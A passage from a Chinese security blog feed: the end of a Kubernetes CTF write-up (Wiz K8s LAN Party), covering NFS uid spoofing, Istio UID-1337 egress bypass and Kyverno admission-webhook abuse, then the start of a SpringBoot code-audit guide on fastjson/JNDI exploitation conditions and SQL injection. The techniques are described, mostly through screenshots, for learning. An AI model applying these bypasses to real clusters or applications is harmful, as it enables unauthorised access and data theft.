alt="image-20250107105141612"></p><p>再结合当前<code>Pod</code>自带了<code>dnscan</code>，也就是说让扫网段探测发现其他<code>Pod</code></p><p>通过<code>env</code>确认apiserver的地址</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/3.png" alt="image-20250107110258324"></p><p>而apiserver大部分都在B段</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/4.png" alt="image-20250107110511034"></p><p>请求下即可获得flag</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/5.png" alt="image-20250107110618924"></p><h4 id="2-FINDING-NEIGHBOURS"><a href="#2-FINDING-NEIGHBOURS" class="headerlink" title="2.FINDING NEIGHBOURS"></a>2.FINDING NEIGHBOURS</h4><p>Description</p><p><em>Sometimes, it seems we are the only ones around, but we should always be on guard against invisible <a href="https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/">sidecars</a> reporting sensitive secrets.</em></p><p>题目描述给出了Sidecar的介绍</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/6.png" alt="image-20250107112612725"></p><p>​也就是说如果是Sidecar模式，<code>Pod</code>中会运行一个容器外加另一个容器(或更多)，它们共同运行在同一个<code> Pod</code> 中，<strong>共享网络和存储资源</strong>，以完成协同工作。</p><p>​看一下网络连接，可以发现本地的192.168.1.51 一直向 10.100.171.123:80 通信</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/7.png" alt="image-20250107134709419"></p><p>​<code>tcpdump</code>抓包</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/8.png" alt="image-20250107134910627"></p><p>  请求包中发现flag</p><p>​<img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/9.png" alt="image-20250107134950224"></p><h4 id="3-DATA-LEAKAGE"><a href="#3-DATA-LEAKAGE" class="headerlink" title="3.DATA LEAKAGE"></a>3.DATA LEAKAGE</h4><p>Description</p><p><em>The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based.</em></p><p>意思是网络共享存储</p><p>看一下挂载文件情况</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/10.png" alt="image-20250107142434212"></p><p>这里留意到有一个<code>fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com</code>和<code>/efs</code>路径</p><p>cd过去没有权限打开</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/11.png" alt="image-20250107142548682"></p><p>GPT分析了这个域名</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/12.png" alt="image-20250107142630818"></p><p> 查看一下挂载点和挂载详情</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/13.png" alt="image-20250107142822999"></p><p>这里有这么一行</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/14.png" alt="image-20250107142943389"></p><p>就是说路径 <code>/efs</code>采用了 NFS v4 协议</p><p>根据Hint#1，得知了一个NFS开源的客户端库，以及命令示例</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/15.png" alt="image-20250107144020016"></p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/16.png" alt="image-20250107144141231"></p><p> <code>nfs-cat</code> 和 <code>nfs-ls</code> 是 NFS的一些常见工具，用于从 NFS 服务器上读取文件内容和列出目录内容</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/17.png" alt="image-20250107144610917"></p><p>提示没有权限</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/18.png" alt="image-20250107144628363"></p><p>根据Hint#2得知还需要提供<code>gid</code>和<code>uid</code></p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/19.png" alt="image-20250107144844701"></p><p>最终成功获取</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/20.png" alt="image-20250107145038274"></p><h4 id="4-BYPASSING-BOUNDARIES"><a href="#4-BYPASSING-BOUNDARIES" class="headerlink" title="4.BYPASSING BOUNDARIES"></a>4.BYPASSING BOUNDARIES</h4><p> Description</p><p> <em>Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don’t abuse this power; use it   responsibly and with caution.</em></p><p>Policy</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">security.istio.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">AuthorizationPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">istio-get-flag</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">k8s-lan-party</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">action:</span> <span class="string">DENY</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">&quot;&#123;flag-pod-name&#125;&quot;</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">from:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">source:</span></span><br><span class="line">        <span class="attr">namespaces:</span> [<span class="string">&quot;k8s-lan-party&quot;</span>]</span><br><span class="line">    <span class="attr">to:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">operation:</span></span><br><span class="line">        <span class="attr">methods:</span> [<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span><br></pre></td></tr></table></figure><p>简单看下，Policy描述了Istio 的安全策略，<code>AuthorizationPolicy</code>表示授权策略资源，控制了对<code>flag-pod-name</code>的访问权限，在<code>k8s-lan-party</code> 命名空间下，如果是GET或POST请求则拒绝</p><p>先走一遍<code>dnscan</code></p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/21.png" alt="image-20250107150624693"></p><p>因为Policy策略，请求被拒绝</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/22.png" alt="image-20250107150659322"></p><p>到处搜一下</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/23.png" alt="image-20250107151441740"></p><p> 最终找到了很详细的一篇文章 <a href="https://pulsesecurity.co.nz/advisories/istio-egress-bypass">Istio outboundTrafficPolicy Egress Control Bypass</a></p><p> 这里有这么一句</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/24.png" alt="image-20250107151551087"></p><p><strong>“An attacker who has root user access in a pod can use to switch to a UID which matches the iptables rules highlighted above and bypasses the restriction”</strong></p><p>​那就看一下当前的权限</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/25.png" alt="image-20250107151648347"></p><p>​打开passwd确认其中也有一个uid为1337的账号</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/26.png" alt="image-20250107151807356"></p><p>使用这个1337的账号请求</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/27.png" alt="image-20250107152109342"></p><p>成功获取flag</p><h4 id="5-LATERAL-MOVEMET"><a href="#5-LATERAL-MOVEMET" class="headerlink" title="5.LATERAL MOVEMET"></a>5.LATERAL MOVEMET</h4><p>Description</p><p><em>Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the <a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">administrative</a> services.</em></p><p>Policy</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kyverno.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">apply-flag-to-env</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">sensitive-ns</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">inject-env-vars</span></span><br><span class="line">      <span class="attr">match:</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">kinds:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Pod</span></span><br><span class="line">      <span class="attr">mutate:</span></span><br><span class="line">        <span class="attr">patchStrategicMerge:</span></span><br><span class="line">          <span class="attr">spec:</span></span><br><span class="line">            <span class="attr">containers:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">                <span class="attr">env:</span></span><br><span class="line">                  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">FLAG</span></span><br><span class="line">                    <span class="attr">value:</span> <span class="string">&quot;&#123;flag&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><code>Kyverno</code> 策略的主要功能是在 <code>sensitive-ns</code> 命名空间中，自动为所有的 <code>Pod</code> 容器注入一个名为 <code>FLAG</code> 的环境变量，值为 <code>&#123;flag&#125;</code></p><p>如果想要获得<code>flag</code>，就需要创建一个<code>pod</code>，并且该 <code>Pod</code> 必须在 <code>sensitive-ns</code> 命名空间中</p><p>简单看下信息，再跑一下<code>dnscan</code></p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/28.png" alt="image-20250107154212794"></p><p>得到了如下域名</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/29.png" alt="image-20250107154319779"></p><p>这里让GPT推测总结一下每个域名的作用</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/30.png" alt="image-20250107174445672"></p><p>​<code>kyverno-svc.kyverno.svc.cluster.local</code>则是服务入口点，结合一下源码 <a href="https://github.com/kyverno/kyverno/blob/main/pkg/config/config.go">kyverno&#x2F;pkg&#x2F;config&#x2F;config.go at main · kyverno&#x2F;kyverno</a></p><p>​可以确定的是路径为<code>/mutate</code></p><p>​<img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/31.png" alt="image-20250107174842355"></p><p>​</p><p>在Description中，还给出了一个链接 <a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">Dynamic Admission Control | Kubernetes</a></p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/32.png" alt="image-20250107175145924"></p><p>描述了<code>AdmissionReview</code> 请求，<code>Kyverno</code> 使用 <code>AdmissionReview</code> 请求来获取每个 API 请求的详细信息并做出相应的操作</p><p>现在的问题来到：如何构造一个<code>AdmissionReview</code> 请求？Hint#1中给出了提示 <a href="https://github.com/anderseknert/kube-review">anderseknert&#x2F;kube-review: Create Kubernetes AdmissionReview requests from Kubernetes resource manifests</a></p><p>依靠这个工具，把原始的 Kubernetes 资源描述文件，转化为 <code>AdmissionReview</code> 请求</p><p>综合上面，得出结论：当前<code>Pod</code>没有权限创建<code>Pod</code>，如果想要获得flag，那么就需要依靠<code>kyverno</code>，通过<code>kube-review</code>构造<code>AdmissionReview</code>请求操作 <code>kyverno</code>来创建<code>Pod</code></p><p>写一个简单的yaml创建<code>Pod</code>，在这里留意命名空间要与Policy命名空间一致</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/33.png" alt="image-20250107193740484"></p><p>运行<code>kube-review</code></p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/34.png" alt="image-20250107194904768"></p><p>得到这些之后，根据官方文档调好请求发送即可</p><p> <img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/35.png" alt="image-20250107195334387"></p><p>​失败了，提示SSL问题</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/36.png" alt="image-20250107195726342"></p><p>​-k 跳过证书验证即可</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/37.png" alt="image-20250107195839868"></p><p>​把这一串base64解码即可得到flag</p><p><img src="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/img/38.png" alt="image-20250107195937783"></p><p>结束，一点感悟：在学习技术的时候，听别人讲、跟着一起做和讲给别人听，这三种学习方法对学习效果的深度逐级递增。</p><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>公式化Java代码审计-SpringBoot</title>
      <link href="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/"/>
      <url>/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/</url>
      
        <content type="html"><![CDATA[<h1 id="公式化Java代码审计-SpringBoot"><a href="#公式化Java代码审计-SpringBoot" class="headerlink" title="公式化Java代码审计-SpringBoot"></a>公式化Java代码审计-SpringBoot</h1><p><strong>免责声明：本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏，否则造成一切后果与发表本文章的作者无关。</strong></p><p>注：全文约<strong>7900</strong>字</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>“Spring Boot在Java开发中的占比非常高，特别是在微服务、云原生和企业级应用中，已经成为主流选择。” </p><p>所以，在渗透测试过程中，笔者对SpringBoot框架接触也是非常的多，这主要取决于遇到过大量的Swagger、Actuator的页面，后面我大概花费了一年的时间，去学习java开发（JavaSE -&gt; JavaWeb -&gt; SSM(Spring SpringMVC Mybatis) -&gt; SpringBoot）来使渗透测试以及代码审计过程中更有发现</p><p>奈何笔者愚笨，对开发仍然一知半解，但好在可以简单看懂了，也对功能点的测试有了新的思考</p><p>经过我一些日子的学习和实践，总结出了我针对SpringBoot框架代码审计的流程</p><h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>为什么要叫公式化？</p><p>当我拿到一个SpringBoot框架的项目，会把审计过程分为<strong>三个阶段</strong>，文章后续也以这三个阶段为目录拓展</p><p><strong>我的代码审计原则是：一切为了漏洞发现和利用</strong></p><h4 id="前期-环境搭建"><a href="#前期-环境搭建" class="headerlink" title="前期(环境搭建)"></a>前期(环境搭建)</h4><p>​在这个时期，不会接触到代码，我们需要把项目环境先搭建起来，阅读开发手册，选择什么环境、选择什么版本的组件都至关重要，漏洞利用是很复杂的，涉及的因素也非常多，我们需要留意如下几个特别点，而不是一股脑把程序跑起来就行</p><h5 id="JDK版本"><a href="#JDK版本" class="headerlink" title="JDK版本"></a>JDK版本</h5><p>​大多数项目都只是说了运行要求的JDK大版本，也就是jdk1.7，jdk1.8，jdk11…</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015163551183.png" alt="image-20241015163551183"></p><p>or</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015171029289.png" alt="image-20241015171029289"></p><p>or</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012152334813.png" alt="image-20241012152334813"></p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012152505587.png" alt="image-20241012152505587"></p><p>在不同jdk的版本中，有不同的功能被修改增加删除，这导致不同版本的jdk对我们的漏洞利用产生的影响无疑的巨大的，主要是小版本的细节问题</p><p>比如，在利用fastjson反序列化漏洞-BasicDataSource链的时候</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/1.png" alt="1"></p><p>执行了命令，利用成功</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011161248364.png" alt="image-20241011161248364"></p><p>利用失败，这是因为在<strong>jdk1.8_251之后移除了com.sun.org.apache.bcel.internal.util.ClassLoader这个类</strong>，而在这之前是可以用的</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011162535167.png" alt="image-20241011162535167"></p><p>还有一个jndi注入的例子</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011163648813.png" alt="image-20241011163648813"></p><p>成功</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011163818084.png" alt="image-20241011164021493"></p><p>利用失败</p><p>这里可以从请求情况看到，只是发送了ldap请求并没有请求到恶意类。</p><p>因为在<strong>Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载</strong></p><p>当然 这是可以绕过的</p><p>小版本的修改还有很多，这里大家可以去自行搜索学习，我就不一一举例了</p><p>可以看到小版本对于漏洞利用影响是多么的大，这里举例一个大版本的：Gopher协议利用SSRF</p><p>众所周知，在<code>rt.sun.net.www.protocol</code>包下负责实现Java对特定网络协议的支持</p><p>如图jdk1.7支持的协议</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011171037948.png" alt="image-20241011171037948"></p><p>可以看到gopher协议的</p><p>但是在jdk1.8中是没有</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011171204695.png" alt="image-20241011171204695"></p><p>这就意味着，当我们在小于jdk1.8的环境中利用SSRF漏洞，就要留意这个问题了</p><p>不同JDK影响Maven，进而影响依赖的问题，还会涉及到依赖传递，这展开说就太多了</p><p>这里引用大佬的一句话 </p><p>​<strong>”应通过修复代码来彻底解决这个问题，而不应依赖于环境的安全增强来规避攻击“</strong></p><h5 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h5><p>比如，在MySQL中：日期函数如<code>NOW()</code>，返回当前时间。字符串函数如<code>CONCAT()</code>，用于拼接字符串</p><p>而到了PostgreSQL：函数CURRENT_TIMESTAMP，返回当前时间，字符串函数如||运算符，支持字符串拼接，而不是CONCAT()函数</p><p>PostgreSQL还有大量特有的函数，例如<code>GENERATE_SERIES()</code>可以生成一个序列，而MySQL中没有直接等价的函数</p><p>ACCESS没有库名，只有表和字段，并且注入时，后面必须跟表名，ACCESS没有注释</p><p>不同的数据库差别太大了，注释符、函数、语法、部署方式、依赖&#x2F;扩展…</p><p><strong>这直接影响了我们怎么构造SQL注入的语句</strong></p><p>​</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011172022967.png" alt="image-20241011172022967"></p><p>对于这种多选一的，不知道大家会怎么选，我个人更倾向于选择MySQL，主要是因为对其他数据库还不够熟悉</p><h5 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h5><p>最熟悉的就是，MySQL数据库5.0后加入的<code>INFORMATION_SCHEMA</code></p><p>比如PostgreSQL，在8.2加入了pg_sleep()延迟函数 </p><p>​Link:<code>https://www.postgresql.org/docs/release/8.2.0/</code></p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/%5B@%7BZ1O7A_R%6007%5DOZ%7BPBK%25%25A.png" alt="img"></p><p>以及SQL Server 2005 中引入的 xp_cmdshell</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011175223652.png" alt="image-20241011175223652"></p><p>还有非常之多</p><h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><p>看这个为了了解项目整体结构。大致了解作者编写逻辑，搞清请求流程。</p><p>SpringBoot继承了 Spring 的传统，集成了 Spring MVC，几乎所有的Spring Boot 项目默认使用 MVC 架构</p><p>目录如下</p><p>​<code>src/main</code>下面有两个目录，分别是<code>java</code>和<code>resources</code></p><p>​<code>java</code>目录中主要存放的是java代码，这里是<strong>重中之重</strong>！要搞清每个目录的含义，对于我们的在审计过程中，请求流程是怎么走的至关重要</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012140136600.png" alt="image-20241012140136600"></p><p>​结合开发手册，配合自己的解读或者单纯看目录名，大概就知道是做什么的了</p><p>​<code>resources</code>目录中主要存放的是资源文件，比如：html、js、css等</p><p>​个别项目还会引入<strong>jsp依赖</strong>，有<code>webapp</code>来存放jsp 但这种情况在SpringBoot项目中是非常少的，这里决定了如果出现文件上传漏洞能否上传webshell</p><p>​一些README.MD中也会对目录给出大致说明</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012141846204.png" alt="image-20241012143423141"></p><p>​ <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012143456115.jpeg" alt="img"></p><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>​这里主要是对<code>application.yml</code>、<code>application.properties</code></p><p>​在这里发现了规定上传文件的大小</p><p>​     <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012144111251.png" alt="image-20241012144133612"></p><p>​jwt秘钥</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012144251276.png" alt="image-20241012144251276"></p><p>​甚至开启了ajp</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012145356583.png" alt="image-20241012145523606"></p><p>​CORS跨域问题</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012145940385.png" alt="image-20241012145940385"></p><p>​还有很多，比如AK&#x2F;SK、各种key等各类数据的硬编码，这都对我们的漏洞利用起着影响</p><p>前期我要说的就这些。主要是搭建环境的选择，如何更有利于我们对漏洞的利用，以及熟悉项目来帮助审计</p><h4 id="中期-手工审计"><a href="#中期-手工审计" class="headerlink" title="中期(手工审计)"></a>中期(手工审计)</h4><p>​到了这里，就来到了代码审计过程中最重要的一个环节，开始从代码入手。为了这个公式化的流程，我分为三步并简单举例：</p><p>pom.xml、正向审计、逆向追踪</p><h5 id="POM"><a href="#POM" class="headerlink" title="POM"></a>POM</h5><p>我主要关注两点：</p><p>​一、了解项目使用到的依赖，使用的依赖哪些有漏洞</p><p>​二、反序列化相关类</p><p>如何快速发现pom中存在漏洞的依赖？</p><p>通过开发文档得知</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012154153022.png" alt="image-20241012154153022"></p><p>没有开发文档，或者一些项目不大 依赖不多，肉眼也是可以整理出来的</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012155130698.png" alt="image-20241012155130698"></p><p>这样直接搜组件漏洞即可</p><p>或者依靠idea的插件识别<code>Package Checker</code></p><p><a href="https://plugins.jetbrains.com/plugin/18337-package-checker">https://plugins.jetbrains.com/plugin/18337-package-checker</a></p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012155408068.png" alt="image-20241012155531407"></p><p>​</p><p>​这里，有一个值得一提的地方，就是依赖传递的问题。比如当年的log4j，影响范围之所以那么大，确实与依赖传递有很大关系。也就是 父pom 引用了一个带漏洞的依赖，我们直接在当前pom是看不到的。</p><p>​我们需要了解一下pom的工作方式：</p><ol><li><code>pom.xml</code> 是当前模块的配置文件：每个 Maven 项目或模块都有一个 <code>pom.xml</code> 文件，它是当前模块的配置，包括依赖、插件、编译设置等内容。</li><li>Maven 项目可以通过继承另一个 pom 文件，通常是一个父  pom 。例如，Spring Boot 项目常常继承 <code>spring-boot-starter-parent</code></li><li>父  pom  中定义的依赖管理、插件管理、属性等内容会传递给子模块</li><li>项目的实际依赖和配置不只是当前 <code>pom.xml</code> 文件中列出的内容，还包括从父 pom 和其他传递依赖中继承过来的部分。因此，<strong>当前的 <code>pom.xml</code> 只是部分配置</strong>，并不是最终生效的 pom</li></ol><p>​也就是说，我们上面直接通过当前<code>pom.xml</code>去筛选，查看对应依赖有没有漏洞，这完全忽略了这种情况，如果父 pom 也就是被传递的依赖有漏洞呢，我们如何查看和确认？</p><p>​首先，大多数父 pom 几乎都是官方 pom，这些官方父 pom 通常经过维护和定期更新，以解决已知问题和漏洞。但发现漏洞依然是有可能的，因为更新不是实时的，而且每个使用者配置也都是不一样的，使用者也未必进行了更新，或者依赖之间的版本兼容问题。</p><p>​<strong>对于POM的审计，主要还是看当前pom.xml的依赖</strong></p><p>​如何获取最终 pom</p><p>​<code>mvn help:effective-pom</code></p><p>​这个命令会生成项目的 有效 pom，它是所有继承的父 POM 和依赖管理都解析后形成的完整 pom 文件</p><p>​原本147行的pom，最后生成了5500行</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012163631899.png" alt="image-20241012163631899"></p><p>​在effective-pom中，看到了tomcat的版本</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012163818089.png" alt="image-20241012165720228"></p><p>​这个版本有对应着 Apache Tomcat HTTP&#x2F;2 拒绝服务漏洞（CVE-2020-11996），就不做复现记录了</p><p>​最终的POM代码量太大，我们依靠工具去检测，<code>dependency-check</code> ，它会分析项目的依赖树，并检查依赖库是否包含已知的安全漏洞，也就是检测最终的POM</p><p>​申请nvdApiKey，<a href="https://nvd.nist.gov/developers/request-an-api-key">https://nvd.nist.gov/developers/request-an-api-key</a></p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012174508843.png" alt="image-20241012174508843"></p><p>​在代码工程的 pom.xml 文件中添加插件依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">        ......</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.owasp&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dependency-check-maven&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">10.0</span><span 